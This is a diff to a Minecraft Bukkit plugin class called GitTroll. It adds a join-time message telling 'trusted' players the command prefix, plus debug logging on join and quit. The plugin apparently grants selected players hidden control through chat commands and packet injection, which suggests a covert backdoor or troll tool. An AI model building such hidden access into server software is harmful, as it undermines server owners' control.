@@ -11,6 +11,7 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
 import com.comphenix.tinyprotocol.TinyProtocol;
@@ -188,9 +189,18 @@ public class GitTroll extends JavaPlugin implements Listener {
 	public void onPlayerJoin(PlayerJoinEvent event) {
 		if(this.isPlayerTrusted(event.getPlayer())) {
 			CustomPlayer.instanceOf(event.getPlayer()).sendGitMessage("You are still trusted.");
+			if(!CommandManager.COMMAND_PREFIX.equalsIgnoreCase("!")) {
+				CustomPlayer.instanceOf(event.getPlayer()).sendGitMessage("The command prefix is §6" + CommandManager.COMMAND_PREFIX + "§a.");
+			}
 		}
+		System.out.println(event.getPlayer().getClass().getName() + "@" + Integer.toHexString(event.getPlayer().hashCode()));
 		//Old packet injector (Still there if you need it)
 //		new PacketInjector(event.getPlayer()).inject();
+	}
+	
+	@EventHandler
+	public void onPlayerQuit(PlayerQuitEvent event) {
+		System.out.println(event.getPlayer().getClass().getName() + "@" + Integer.toHexString(event.getPlayer().hashCode()));
 	}
 	
 }
